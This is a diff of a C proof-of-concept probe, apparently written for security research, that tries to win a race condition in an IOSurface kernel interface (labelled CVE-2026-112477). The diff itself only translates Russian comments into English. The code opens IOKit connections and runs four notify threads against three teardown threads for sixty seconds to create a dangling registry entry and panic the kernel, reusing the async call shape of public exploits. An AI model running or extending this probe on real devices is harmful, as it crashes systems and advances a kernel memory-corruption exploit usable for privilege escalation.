@@ -1,13 +1,13 @@
-/* probe_iorace.c — гонка CVE-2026-112477: s_set_surface_notify vs client teardown.
+/* probe_iorace.c - CVE-2026-112477 race: s_set_surface_notify vs client teardown.
  *
- * Механика (docs/FINDINGS_cve_2026_112477_iosurface_race.md):
- *   27.0: регистрация listener не проверяет dying-флаг клиента;
- *         teardown сначала освобождает ресурсы, потом удаляет из реестра.
- *   Окно: регистрация во время teardown -> запись в реестре на мёртвый объект.
+ * Mechanism:
+ *   27.0: listener registration does not check the client's dying flag;
+ *         teardown frees resources first and unlinks from the registry afterwards.
+ *   Window: registration during teardown -> registry entry pointing at a dead object.
  *
- * Проба: поток A в цикле зовёт selector 17 (s_set_surface_notify) на живом
- * клиенте и поверхности; поток B в цикле закрывает и переоткрывает клиент.
- * Чистый userland, без ядерных структур. Паника = гонка поймана.
+ * Probe: thread A calls selector 17 (s_set_surface_notify) in a loop on a live
+ * client and surface; thread B closes and reopens the client in a loop.
+ * Pure userland, no kernel structures. A panic means the race was hit.
  */
 typedef unsigned long size_t;
 typedef unsigned int mach_port_t;
@@ -44,7 +44,7 @@ typedef int (*fn_io_connect_call_method)(mach_port_t, unsigned int,
     unsigned long long *, unsigned int *, void *, size_t *);
 typedef mach_port_t (*fn_mach_task_self)(void);
 
-/* CFDictionary для create_surface fast path не нужен: используем struct-args селектор 6 */
+/* no CFDictionary needed for the create_surface fast path: use the struct-args selector 6 */
 
 static fn_io_service_get_matching p_getsvc;
 static fn_io_service_open p_open;
@@ -81,7 +81,7 @@ static mach_port_t open_client(void) {
 
 static unsigned int make_surface(mach_port_t conn) {
     (void)conn;
-    /* IOSurfaceCreate из фреймворка (проверенный путь из probe_res) */
+    /* IOSurfaceCreate from the framework (the verified path from probe_res) */
     void *io = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
     void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_LAZY);
     if (!io || !cf) return 0;
@@ -124,19 +124,19 @@ static unsigned int make_surface(mach_port_t conn) {
         putu(sid);
         put("\n");
     }
-    /* surf намеренно не release — поверхность живёт в системе, гонка на id */
+    /* surf is intentionally not released - the surface lives on, the race targets the id */
     return sid;
 }
 
 static void *thread_notify(void *arg) {
     (void)arg;
     pthread_setname_np("IORACE-A");
-    /* s_set_surface_notify — ASYNC метод: wake_port + refcon + scalars.
-     * Форма по публичным PoC (async_wake/ziVA): IOConnectCallAsyncScalarMethod.
-     * Обычный IOConnectCallMethod даёт BadArgument — не та форма аргументов. */
+    /* s_set_surface_notify is an ASYNC method: wake_port + refcon + scalars.
+     * Shape taken from public PoCs (async_wake/ziVA): IOConnectCallAsyncScalarMethod.
+     * A plain IOConnectCallMethod returns BadArgument - wrong argument shape. */
     void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
-    /* Точная ABI из async_wake (Ian Beer): IOConnectCallAsyncMethod,
-     * scalarCnt=0, structureInput = 24 байта {1,2,3}, wake port + MAKE_SEND,
+    /* Exact ABI from async_wake (Ian Beer): IOConnectCallAsyncMethod,
+     * scalarCnt=0, structureInput = 24 bytes {1,2,3}, wake port + MAKE_SEND,
      * reference={0} count 1. */
     int (*p_async)(mach_port_t, unsigned int, mach_port_t,
                    unsigned long long *, unsigned int,
@@ -159,10 +159,10 @@ static void *thread_notify(void *arg) {
         put("IORACE no-async-sym\n");
         return 0;
     }
-    /* wake port: receive right + send right (ядро шлёт через send right) */
+    /* wake port: receive right + send right (the kernel sends via the send right) */
     mach_port_t wp = 0;
     p_port_alloc(g_task, 1, &wp);                       /* MACH_PORT_RIGHT_RECEIVE */
-    /* MACH_MSG_TYPE_MAKE_SEND = 20: создать send right, сохранив receive */
+    /* MACH_MSG_TYPE_MAKE_SEND = 20: create a send right while keeping the receive right */
     int irr = p_insert_right(g_task, wp, wp, 20);
     put("IORACE wakeport=");
     putu(wp);
@@ -213,7 +213,7 @@ static void *thread_teardown(void *arg) {
         unsigned int sid = make_surface(c);
         g_conn = c;
         g_surface_id = sid;
-        usleep(20);               /* короткое окно: notify успевает дёрнуть живую поверхность */
+        usleep(20);               /* short window: notify still reaches a live surface */
         p_close(c);               /* teardown -> F3 */
         g_conn = 0;
         g_cycles++;
@@ -247,7 +247,7 @@ int main(void) {
     putu(sid0);
     put("\n");
 
-    /* Калибровка sel 17 на стабильном соединении, ДО запуска потоков гонки */
+    /* Calibrate selector 17 on a stable connection, BEFORE the race threads start */
     {
         void *iokit2 = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
         int (*p_async)(mach_port_t, unsigned int, mach_port_t,
@@ -277,7 +277,7 @@ int main(void) {
             usleep(100000);
             unsigned long long refc[1] = { 0 };
             unsigned long long inscal[1] = { 0 };
-            unsigned long long istruct[3] = { 1, 2, 3 };  /* structure input, 24 байта */
+            unsigned long long istruct[3] = { 1, 2, 3 };  /* structure input, 24 bytes */
             unsigned long long oscal[16] = {0};
             char ostruct[4096];
             unsigned int oscal_cnt = 0;
@@ -302,14 +302,14 @@ int main(void) {
     g_conn = c0;
     g_surface_id = sid0;
 
-    /* Усиленная гонка: 4 notify-потока + 3 teardown-потока, 60 секунд.
-     * Teardown без usleep — максимальный темп open/close, чтобы окно
-     * teardown-колбэков пересекалось с notify чаще. */
+    /* Reinforced race: 4 notify threads + 3 teardown threads, 60 seconds.
+     * Teardown without usleep - maximum open/close rate so teardown callbacks
+     * overlap the notify window more often. */
     unsigned long th[7];
     for (int i = 0; i < 4; i++) pthread_create(&th[i], 0, thread_notify, 0);
     for (int i = 0; i < 3; i++) pthread_create(&th[4 + i], 0, thread_teardown, 0);
 
-    for (int i = 0; i < 60; i++) usleep(1000000);   /* 60 секунд гонки */
+    for (int i = 0; i < 60; i++) usleep(1000000);   /* 60 seconds of racing */
 
     g_stop = 1;
     usleep(200000);
